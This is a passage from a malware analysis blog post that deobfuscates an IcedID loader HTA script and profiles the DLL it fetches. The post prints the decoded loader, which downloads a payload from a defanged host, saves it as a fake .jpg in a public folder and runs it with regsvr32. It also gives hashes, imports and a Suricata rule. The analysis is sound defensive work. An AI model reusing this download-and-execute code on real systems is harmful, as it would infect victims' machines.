                <span class="k">return</span><span class="p">(</span><span class="nx">videoSuper</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="kd">function</span> <span class="nf">i7AsusVideo</span><span class="p">(</span><span class="nx">i7Processor</span><span class="p">){</span>
                <span class="k">return</span> <span class="nx">i7Processor</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">''</span><span class="p">).</span><span class="nf">reverse</span><span class="p">().</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="kd">function</span> <span class="nf">monitorMonitorRtx</span><span class="p">(</span><span class="nx">processorAsus</span><span class="p">){</span>
                <span class="k">return</span><span class="p">(</span><span class="nf">i7AsusVideo</span><span class="p">(</span><span class="nf">tableI9I9</span><span class="p">(</span><span class="nx">processorAsus</span><span class="p">)));</span>
            <span class="p">}</span>
            <span class="kd">function</span> <span class="nf">asusProcessorMonitor</span><span class="p">(</span><span class="nx">processorAsus</span><span class="p">,</span> <span class="nx">centerNotebook</span><span class="p">){</span>
                <span class="k">return</span><span class="p">(</span><span class="nx">processorAsus</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="nx">centerNotebook</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="nx">cardTableMonitor</span> <span class="o">=</span> <span class="nb">window</span><span class="p">;</span>
            <span class="nx">tableNotebook</span> <span class="o">=</span> <span class="nb">document</span><span class="p">;</span>
            <span class="nx">cardTableMonitor</span><span class="p">[</span><span class="dl">'</span><span class="s1">moveTo</span><span class="dl">'</span><span class="p">](</span><span class="o">-</span><span class="mi">101</span><span class="p">,</span> <span class="o">-</span><span class="mi">102</span><span class="p">);</span>
            <span class="kd">var</span> <span class="nx">tableRtx</span> <span class="o">=</span> <span class="nf">cardI9Processor</span><span class="p">(</span><span class="dl">'</span><span class="s1">rtxI7</span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">---</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">var</span> <span class="nx">cardComputerMonitor</span> <span class="o">=</span> <span class="nf">monitorMonitorRtx</span><span class="p">(</span><span class="nx">tableRtx</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            <span class="kd">var</span> <span class="nx">rtxI7Super</span> <span class="o">=</span> <span class="nf">monitorMonitorRtx</span><span class="p">(</span><span class="nx">tableRtx</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nt">&lt;/script&gt;</span>
        <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'javascript'</span><span class="nt">&gt;</span>
            <span class="kd">function</span> <span class="nf">rtxVideo</span><span class="p">(</span><span class="nx">processorProcessorVideo</span><span class="p">){</span>
                <span class="nx">cardTableMonitor</span><span class="p">[</span><span class="nf">cardI9Processor</span><span class="p">(</span><span class="dl">'</span><span class="s1">processorRtx</span><span class="dl">'</span><span class="p">)](</span><span class="nx">processorProcessorVideo</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="nt">&lt;/script&gt;</span>
        <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'vbscript'</span><span class="nt">&gt;</span>
            <span class="nx">Call</span> <span class="nf">rtxVideo</span><span class="p">(</span><span class="nx">cardComputerMonitor</span><span class="p">)</span>
            <span class="nx">Call</span> <span class="nf">rtxVideo</span><span class="p">(</span><span class="nx">rtxI7Super</span><span class="p">)</span>
        <span class="nt">&lt;/script&gt;</span>
        <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'javascript'</span><span class="nt">&gt;</span>
            <span class="nx">cardTableMonitor</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
        <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>We can make a few hypotheses about the code:</p><ul><li><code class="language-plaintext highlighter-rouge">&lt;&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> and the string <code class="language-plaintext highlighter-rouge">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</code> show the possible use of a rotation cipher<li><code class="language-plaintext highlighter-rouge">eval</code> is the JavaScript keyword to execute additional JavaScript code<li><code class="language-plaintext highlighter-rouge">.split("---")</code> and <code class="language-plaintext highlighter-rouge">---</code> in the larger string above indicate the larger string will get split in two elements</ul><p>At the end of the document the scripting changes languages from JavaScript to VBscript but it doesn’t really make a difference in execution. The beautiful and handy thing about this stage is that it doesn’t use any Windows-specific scripting structures, which means we can easily use a NodeJS REPL to decode everything without having to manually decode the cipher. To do this, we can split the larger string manually and feed it into the <code class="language-plaintext highlighter-rouge">monitorMonitorRtx()</code> function.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>&gt; string1 = 'fX17KWUoaGN0YWN9O2Vzb2xjLnh0Um9lZGlWZWxiYXQ7KTIgLCJncGouN0lldHliYWdpZ1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMueHRSb2VkaVZlbGJhdDspeWRvYmVzbm9wc2VyLnJlcHVTcm9zc2Vjb3JQb2VkaXYoZXRpcncueHRSb2VkaVZlbGJhdDsxID0gZXB5dC54dFJvZWRpVmVsYmF0O25lcG8ueHRSb2VkaVZlbGJhdDspIm1hZXJ0cy5iZG9kYSIodGNlamJPWGV2aXRjQSB3ZW4gPSB4dFJvZWRpVmVsYmF0IHJhdnt5cnR7KTAwMiA9PSBzdXRhdHMucmVwdVNyb3NzZWNvclBvZWRpdihmaTspKGRuZXMucmVwdVNyb3NzZWNvclBvZWRpdjspZXNsYWYgLCIwYk85ZDN6QUpOZGlBeXg5alpPeldnT3QwMT1kaXMmcUVQNTh4QURpaHNMQWFQdDhYQmpDWWNqY1h3WnZkPWVnYXAmdnQxczdwV1ZSSEdMWUpmNmdyY0QwZHl2WVg9ZWdhcCY1Nm1ldVFhQkI4Vj1lZ2FwPzNpY2F2L0YxVXJyRVgxVUFGYlJMekFBeUcvVHhlV2FiaURpOGRlR3FhdWVCTkdsRmZEV2FjQXA5TmtGNy83NzJRRkd2RklQZ3BiNlZsdHhHaHVFYnNEdHpIT3l2ZnFWYVZwNWJZODZJY3d1clMvMDgyOTQvcDB4ZGVISVZrU0kvQkZTd25lYVVmelNlS2svVEZiSWVnUWNNZjJlNWg0Yjl4SDB4RWU0aE1xalMvN29lcm9rbmx5SzkxdTllTkRBTXBTQXJhQ2JuUUxUZUpLTGFBcmpRSWhBcS82eW5zVHBaNnZCWndYazlCTWZMSzB0QlNhSVluaTUvVmdSRDRvckppOUZPQkdqT3hERjg3YXZGVFc1UVM3ZXlDbGNkOEwvZWhyZi9tb2MuZ3Rzb29ibGV0YXAvLzpwdHRoIiAsIlRFRyIobmVwby5yZXB1U3Jvc3NlY29yUG9lZGl2OykicHR0aGxteC4ybG14c20iKHRjZWpiT1hldml0Y0Egd2VuID0gcmVwdVNyb3NzZWNvclBvZWRpdiByYXY='

&gt; monitorMonitorRtx(string1)
'var videoProcessorSuper = new ActiveXObject("msxml2.xmlhttp");videoProcessorSuper.open("GET", "hxxp://patelboostg[.]com/frhe/L8dclCye7SQ5WTFva78FDxOjGBOF9iJro4DRgV/5inYIaSBt0KLfMB9kXwZBv6ZpTsny6/qAhIQjrAaLKJeTLQnbCarASpMADNe9u19Kylnkoreo7/SjqMh4eEx0Hx9b4h5e2fMcQgeIbFT/kKeSzfUaenwSFB/ISkVIHedx0p/49280/SruwcI68Yb5pVaVqfvyOHztDsbEuhGxtlV6bpgPIFvGFQ277/7FkN9pAcaWDfFlGNBeuaqGed8iDibaWexT/GyAAzLRbFAU1XErrU1F/vaci3?page=V8BBaQuem65&amp;page=XYvyd0Dcrg6fJYLGHRVWp7s1tv&amp;page=dvZwXcjcYCjBX8tPaALshiDAx85PEq&amp;sid=10tOgWzOZj9xyAidNJAz3d9Ob0", false);videoProcessorSuper.send();if(videoProcessorSuper.status == 200){try{var tableVideoRtx = new ActiveXObject("adodb.stream");tableVideoRtx.open;tableVideoRtx.type = 1;tableVideoRtx.write(videoProcessorSuper.responsebody);tableVideoRtx.savetofile("c:\\\\users\\\\public\\\\gigabyteI7.jpg", 2);tableVideoRtx.close;}catch(e){}}'

&gt; var string2 = 'OykiZ3BqLjdJZXR5YmFnaWdcXGNpbGJ1cFxcc3Jlc3VcXDpjIDIzcnZzZ2VyIihudXIuZXR5YmFnaUdlbGJhVHh0cjspInRjZWpib21ldHN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqYk9YZXZpdGNBIHdlbiA9IGVsYmFUZXN1b003aSByYXY7KSJsbGVocy50cGlyY3N3Iih0Y2VqYk9YZXZpdGNBIHdlbiA9IGV0eWJhZ2lHZWxiYVR4dHIgcmF2'

&gt; monitorMonitorRtx(string2)
'var rtxTableGigabyte = new ActiveXObject("wscript.shell");var i7MouseTable = new ActiveXObject("scripting.filesystemobject");rtxTableGigabyte.run("regsvr32 c:\\\\users\\\\public\\\\gigabyteI7.jpg");'
</pre></table></code></div></div><p>Piecing those components together we get this script that executes via an <code class="language-plaintext highlighter-rouge">eval</code> statement:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">videoProcessorSuper</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">msxml2.xmlhttp</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">videoProcessorSuper</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">hxxp://patelboostg[.]com/frhe/L8dclCye7SQ5WTFva78FDxOjGBOF9iJro4DRgV/5inYIaSBt0KLfMB9kXwZBv6ZpTsny6/qAhIQjrAaLKJeTLQnbCarASpMADNe9u19Kylnkoreo7/SjqMh4eEx0Hx9b4h5e2fMcQgeIbFT/kKeSzfUaenwSFB/ISkVIHedx0p/49280/SruwcI68Yb5pVaVqfvyOHztDsbEuhGxtlV6bpgPIFvGFQ277/7FkN9pAcaWDfFlGNBeuaqGed8iDibaWexT/GyAAzLRbFAU1XErrU1F/vaci3?page=V8BBaQuem65&amp;page=XYvyd0Dcrg6fJYLGHRVWp7s1tv&amp;page=dvZwXcjcYCjBX8tPaALshiDAx85PEq&amp;sid=10tOgWzOZj9xyAidNJAz3d9Ob0</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
<span class="nx">videoProcessorSuper</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nx">videoProcessorSuper</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
    <span class="k">try</span><span class="p">{</span>
        <span class="kd">var</span> <span class="nx">tableVideoRtx</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">adodb.stream</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">tableVideoRtx</span><span class="p">.</span><span class="nx">open</span><span class="p">;</span>
        <span class="nx">tableVideoRtx</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="nx">tableVideoRtx</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nx">videoProcessorSuper</span><span class="p">.</span><span class="nx">responsebody</span><span class="p">);</span>
        <span class="nx">tableVideoRtx</span><span class="p">.</span><span class="nf">savetofile</span><span class="p">(</span><span class="dl">"</span><span class="s2">c:</span><span class="se">\\\\</span><span class="s2">users</span><span class="se">\\\\</span><span class="s2">public</span><span class="se">\\\\</span><span class="s2">gigabyteI7.jpg</span><span class="dl">"</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="nx">tableVideoRtx</span><span class="p">.</span><span class="nx">close</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">rtxTableGigabyte</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">wscript.shell</span><span class="dl">"</span><span class="p">);</span><span class="kd">var</span> <span class="nx">i7MouseTable</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">scripting.filesystemobject</span><span class="dl">"</span><span class="p">);</span><span class="nx">rtxTableGigabyte</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="dl">"</span><span class="s2">regsvr32 c:</span><span class="se">\\\\</span><span class="s2">users</span><span class="se">\\\\</span><span class="s2">public</span><span class="se">\\\\</span><span class="s2">gigabyteI7.jpg</span><span class="dl">"</span><span class="p">);</span>
</pre></table></code></div></div><p>Some more hypotheses:</p><ul><li>Something (presumably a DLL) gets downloaded from <code class="language-plaintext highlighter-rouge">patelboostg[.]com</code><li>The something gets written to <code class="language-plaintext highlighter-rouge">c:\users\public\gigabyteI7.jpg</code><li>The HTA document (executed by <code class="language-plaintext highlighter-rouge">mshta.exe</code>) will execute <code class="language-plaintext highlighter-rouge">regsvr32 c:\users\public\gigabyteI7.jpg</code></ul><h2 id="analyzing-the-downloaded-dll"><span class="me-2">Analyzing the Downloaded DLL</span><a href="#analyzing-the-downloaded-dll" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The downloaded DLL has these properties:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>filepath:   gigabyteI7.jpg
md5:        815d99185422a8a1f891f902824da431
sha1:       0b33b6b89e805e180e6e1bb272bb66de6c9f99d0
sha256:     317383e111b7d1c2e9b6743f7b71263bff669d2e47c3e1a7853e1e616d6b1317
ssdeep:     3072:aiKU8Wb6WxbqCM8aSEFrsEdRBHS3XVJS3YMJ/Pu0DMLLcLGiDZxr:AUnlMMCrr9SnV0VLGi9d
imphash:    00a5fbfb9a1df393796976ca031dea1e
rich:       cb10e59fdfb53fda4e672326b51f6e56
</pre></table></code></div></div><p>The import table hash (imphash) and rich header hash (rich) can help you find similar samples in VirusTotal or other services. When combining searches using both of those hash values you can discover samples with similar capabilities made in similar build environments when compared with this DLL sample.</p><p>Looking at the DLL with <code class="language-plaintext highlighter-rouge">pedump</code>, we find some more data. First, the DLL exports:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>=== EXPORTS ===

# module "stub.dll"
# flags=0x0  ts="2106-02-07 06:28:15"  version=0.0  ord_base=1
# nFuncs=3  nNames=3

  ORD ENTRY_VA  NAME
    1     a84c  DllGetClassObject
    2     a814  DllRegisterServer
    3     ab5c  PluginInit
</pre></table></code></div></div><p>The export <code class="language-plaintext highlighter-rouge">DllRegisterServer</code> jives with what we can expect of the malware, it’s the DLL export used by <code class="language-plaintext highlighter-rouge">regsvr32.exe</code>. If we decide to continue analysis with Ghidra or another tool that’s an excellent entry point to start analysis. The export <code class="language-plaintext highlighter-rouge">PluginInit</code> is also interesting. I usually expect exports like <code class="language-plaintext highlighter-rouge">DllRegisterServer</code>, <code class="language-plaintext highlighter-rouge">DllUnregisterServer</code>, <code class="language-plaintext highlighter-rouge">DllMain</code>, <code class="language-plaintext highlighter-rouge">ServiceMain</code>, or others, and <code class="language-plaintext highlighter-rouge">PluginInit</code> isn’t one I commonly encounter. This would also be another excellent lead in Ghidra.</p><p>Using <code class="language-plaintext highlighter-rouge">manalyze</code> we can also see some suspicious imports:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>[ SUSPICIOUS ] The PE contains functions most legitimate programs don't use.
    [!] The program may be hiding some of its imports:
        GetProcAddress
        LoadLibraryExW
    Functions which can be used for anti-debugging purposes:
        SwitchToThread
    Memory manipulation functions often used by packers:
        VirtualProtect
        VirtualAlloc
</pre></table></code></div></div><p>VirtualAlloc, VirtualProtect, and SwitchToThread might be fun breakpoints if we decide to get rowdy with a debugger.</p><h2 id="confirming-hypotheses-with-a-sandbox"><span class="me-2">Confirming Hypotheses with a Sandbox</span><a href="#confirming-hypotheses-with-a-sandbox" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can dive deeper into static analysis using Ghidra and x64debug, but I wan to eventually go to bed tonight. So I’m going to consult sandbox reports from ANY.RUN and Tria.ge.</p><ul><li><a href="https://app.any.run/tasks/0747e33b-70c5-4154-ae55-5111424b02ac/">https://app.any.run/tasks/0747e33b-70c5-4154-ae55-5111424b02ac/</a><li><a href="https://tria.ge/211231-m85kasfchr">https://tria.ge/211231-m85kasfchr</a></ul><p>Looking at those reports, we can confirm our hypotheses about process ancestry.</p><p><a href="/assets/images/icedid-document-analysis/any-run-report.png" class="popup img-link shimmer"><img src="/assets/images/icedid-document-analysis/any-run-report.png" alt="ANY.RUN Report" loading="lazy"></a></p><p><a href="/assets/images/icedid-document-analysis/triage-report.png" class="popup img-link shimmer"><img src="/assets/images/icedid-document-analysis/triage-report.png" alt="Triage Report" loading="lazy"></a></p><p>The Tria.ge report suggests another data point, that this threat is classified as IcedID. Again, this jives with previous data from MalwareBazaar suggesting the original document was related to IcedID.</p><p><a href="/assets/images/icedid-document-analysis/icedid-alerts.png" class="popup img-link shimmer"><img src="/assets/images/icedid-document-analysis/icedid-alerts.png" alt="Triage Sandbox Suricata Alert" loading="lazy"></a></p><h2 id="how-do-we-know-its-icedid"><span class="me-2">How Do We Know It’s IcedID???</span><a href="#how-do-we-know-its-icedid" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>One of the things that greatly bothers me about many intelligence reports/blog posts/etc. is that they often don’t spell out how they know the malware is related to a named threat. So I’m going to go the extra step to do that here.</p><p>First, the export <code class="language-plaintext highlighter-rouge">PluginInit</code> has been documented with IcedID before:</p><ul><li><a href="https://www.splunk.com/en_us/blog/security/detecting-icedid-could-it-be-a-trickbot-copycat.html">https://www.splunk.com/en_us/blog/security/detecting-icedid-could-it-be-a-trickbot-copycat.html</a><li><a href="https://blogs.vmware.com/security/2021/07/icedid-analysis-and-detection.html">https://blogs.vmware.com/security/2021/07/icedid-analysis-and-detection.html</a><li><a href="https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/">https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/</a></ul><p>Next, we can dig into the Tria.ge report. The reports suggests it found evidence of IcedID based on this Suricata alert:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:"ET MALWARE Win32/IcedID Request Cookie"; flow:established,to_server; http.method; content:"GET"; http.cookie; content:"_gads="; depth:7; content:"_gat="; distance:0; content:"_ga="; distance:0; content:"_u="; distance:0; content:"_io="; distance:0; content:"_gid="; distance:0; reference:url,sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html; reference:url,www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html; classtype:trojan-activity; sid:2032086; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2021_03_17, deployment Perimeter, former_category MALWARE, signature_severity Major, updated_at 2021_03_17;)
</pre></table></code></div></div><p>Essentially, the rule hits on HTTP GET requests with cookies containing <code class="language-plaintext highlighter-rouge">_gads=</code>, <code class="language-plaintext highlighter-rouge">_gat=</code>, <code class="language-plaintext highlighter-rouge">_ga=</code>, <code class="language-plaintext highlighter-rouge">_u=</code>, <code class="language-plaintext highlighter-rouge">_io=</code>, and <code class="language-plaintext highlighter-rouge">_gid=</code> values. These fields are explained within the blog post mentioned in the rule <a href="https://sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html">https://sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html</a>.</p><p>If Suricata found criteria that hit that rule, we can confirm the alert using a PCAP from the sandbox report. We can toss this into Wireshark and follow the TCP stream that aligns with unencrypted HTTP traffic on port 80.</p><p><a href="/assets/images/icedid-document-analysis/tcp-stream.png" class="popup img-link shimmer"><img src="/assets/images/icedid-document-analysis/tcp-stream.png" alt="Wireshark TCP Stream" loading="lazy"></a></p><p>Within that stream we can see the cookie values Suricata found:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Cookie: __gads=2507181075:1:259392:73; _gat=10.0.15063.64; _ga=1.198354.1970169159.96;
 _u=4D484B4B48555949:41646D696E:34384630373343324432444138443743; 
 __io=21_369956170_74428499_1628131376; _gid=B3BF3B3C3D65
</pre></table></code></div></div><p>If the threat really is IcedID, we should be able to decode these cookie values using the method described in the Sysopfb blog post above. According to the post, the <code class="language-plaintext highlighter-rouge">_u</code> value can be decoded using <code class="language-plaintext highlighter-rouge">unhexlify</code> in Python. We can give that a shot here to see if it decodes properly:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">binascii</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">unhexlify</span><span class="p">(</span><span class="sh">'</span><span class="s">4D484B4B48555949</span><span class="sh">'</span><span class="p">)</span>
<span class="sa">b</span><span class="sh">'</span><span class="s">MHKKHUYI</span><span class="sh">'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">unhexlify</span><span class="p">(</span><span class="sh">'</span><span class="s">41646D696E</span><span class="sh">'</span><span class="p">)</span>
<span class="sa">b</span><span class="sh">'</span><span class="s">Admin</span><span class="sh">'</span>
</pre></table></code></div></div><p>The first value decodes to what was presumably the sandbox VM’s hostname and the second value decodes to the affected username.</p><p>The <code class="language-plaintext highlighter-rouge">_gat</code> value contains <code class="language-plaintext highlighter-rouge">10.0.15063.64</code>. The Sysopfb blog post indicates that in IcedID this corresponds to the victim’s Windows version. This version we see in the cookie does correspond to a known Windows build, so that data overlaps.</p><p>These cookie overlaps alongside <code class="language-plaintext highlighter-rouge">PluginInit</code> give me enough data points to assert with medium to high confidence we’re looking at IcedID.</p><p>Thanks for joining in, and Happy New Year!!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/malware/">Malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/icedid/" class="post-tag no-text-decoration" >icedid</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/msword/" class="post-tag no-text-decoration" >msword</a> <a href="/tags/mshta/" class="post-tag no-text-decoration" >mshta</a> <a href="/tags/regsvr32/" class="post-tag no-text-decoration" >regsvr32</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Analyzing%20an%20IcedID%20Loader%20Document%20-%20Tony%20Lambert&url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-icedid-document%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Analyzing%20an%20IcedID%20Loader%20Document%20-%20Tony%20Lambert&u=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-icedid-document%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-icedid-document%2F&text=Analyzing%20an%20IcedID%20Loader%20Document%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-icedid-document%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <script defer type="module" src="https://cdn.jsdelivr.net/npm/@justinribeiro/share-to-mastodon/+esm"></script> <button class="btn text-start" data-bs-toggle="tooltip" data-bs-placement="top" title="Mastodon" aria-label="Mastodon"> <share-to-mastodon class="share-mastodon" message="Analyzing%20an%20IcedID%20Loader%20Document%20-%20Tony%20Lambert" url="https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-icedid-document%2F"customInstanceList="[{&quot;label&quot;:&quot;mastodon.social&quot;,&quot;link&quot;:&quot;https://mastodon.social/&quot;},{&quot;label&quot;:&quot;mastodon.online&quot;,&quot;link&quot;:&quot;https://mastodon.online/&quot;},{&quot;label&quot;:&quot;fosstodon.org&quot;,&quot;link&quot;:&quot;https://fosstodon.org/&quot;},{&quot;label&quot;:&quot;infosec.exchange&quot;,&quot;link&quot;:&quot;https://infosec.exchange/&quot;}]" > <i class="fa-fw fa-brands fa-mastodon"></i> </share-to-mastodon> </button> <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fforensicitguy.github.io%2Fanalyzing-icedid-document%2F&title=Analyzing%20an%20IcedID%20Loader%20Document%20-%20Tony%20Lambert" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit"> <i class="fa-fw fa-brands fa-square-reddit"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/decompiling-jphp-loader-binwalk-cfr/">Decompiling a JPHP Loader with binwalk and cfr</a><li class="text-truncate lh-lg"> <a href="/dissecting-java-pikabot-dropper/">Dissecting a Java Pikabot Dropper</a><li class="text-truncate lh-lg"> <a href="/timelining-malware-vhd-intelligence/">Timelining a Malicious VHD for More Intelligence</a><li class="text-truncate lh-lg"> <a href="/vhd-malware-an-excellent-choice/">Malware via VHD Files, an Excellent Choice</a><li class="text-truncate lh-lg"> <a href="/faster-malware-triage-yara/">Faster Malware Triage with YARA</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/msi/">msi</a> <a class="post-tag btn btn-outline-primary" 